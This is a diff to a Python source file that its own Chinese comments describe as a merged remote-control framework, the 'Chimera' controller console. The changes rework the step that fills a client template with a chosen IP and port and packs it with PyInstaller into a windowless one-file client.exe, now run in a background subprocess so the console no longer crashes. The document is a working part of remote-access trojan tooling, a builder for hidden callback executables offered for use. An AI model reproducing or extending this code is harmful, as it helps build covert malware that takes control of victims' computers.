@@ -1,4 +1,4 @@
-# xxHDSx.py - 三大远控框架合成版（全功能桌面主控端与完整修复版）
+# xxHDSx.py - 三大远控框架合成版（全功能桌面主控端与防闪退完整版）
 
 import tkinter as tk
 from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
@@ -303,7 +303,7 @@ if __name__ == "__main__":
 class ChimeraSuper:
     def __init__(self, root):
         self.root = root
-        root.title("🧬 Chimera 超级合成主控端（完整修复版）")
+        root.title("🧬 Chimera 超级合成主控端（防闪退完整版）")
         root.geometry("1000x750")
         self.clients = {}
         self.client_info = {}
@@ -467,7 +467,7 @@ class ChimeraSuper:
         self.status_bar.config(text=msg)
         self.root.update()
 
-    # ---- 修复后的客户端编译打包逻辑（内置 PyInstaller API，防 9009 报错） ----
+    # ---- 独立子进程打包逻辑（彻底根治点击生成按钮时主控端闪退的问题） ----
     def build_client(self):
         ip = self.ip_entry.get()
         port = self.port_entry.get()
@@ -479,29 +479,29 @@ class ChimeraSuper:
         
         code = CLIENT_TCP_TEMPLATE % (ip, port)
         with open("client.py", "w", encoding="utf-8") as f: f.write(code)
-        self.log("正在通过内置接口打包 client.exe ...")
+        self.log("正在后台独立子进程中打包 client.exe ...")
         
-        try:
-            import PyInstaller.__main__
-            PyInstaller.__main__.run([
-                'client.py',
-                '--onefile',
-                '--noconsole',
-                '--name',
-                'client'
-            ])
-            if os.path.exists("dist/client.exe"):
-                if os.path.exists("client.exe"):
-                    os.remove("client.exe")
-                os.replace("dist/client.exe", "client.exe")
-                self.log("client.exe 生成成功！")
-                messagebox.showinfo("成功", "client.exe 已在当前目录下生成")
-            else:
-                messagebox.showerror("失败", "打包未生成目标文件")
-        except Exception as e:
-            messagebox.showerror("错误", f"打包出错: {e}")
+        def run_packing():
+            try:
+                cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "client", "client.py"]
+                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                stdout, stderr = process.communicate()
+                
+                if os.path.exists("dist/client.exe"):
+                    if os.path.exists("client.exe"):
+                        os.remove("client.exe")
+                    os.replace("dist/client.exe", "client.exe")
+                    self.root.after(0, lambda: self.log("client.exe 生成成功！"))
+                    self.root.after(0, lambda: messagebox.showinfo("成功", "client.exe 已在当前目录下生成"))
+                else:
+                    err_msg = stderr.decode('gbk', errors='ignore') or "未知错误"
+                    self.root.after(0, lambda: messagebox.showerror("失败", f"打包未生成目标文件\n{err_msg[:200]}"))
+            except Exception as e:
+                self.root.after(0, lambda: messagebox.showerror("错误", f"打包出错: {e}"))
 
-    # ---- 补全的监听启动逻辑（修复 start_listen 缺失报错） ----
+        threading.Thread(target=run_packing, daemon=True).start()
+
+    # ---- 监听启动逻辑 ----
     def start_listen(self):
         if self.running: return
         try:
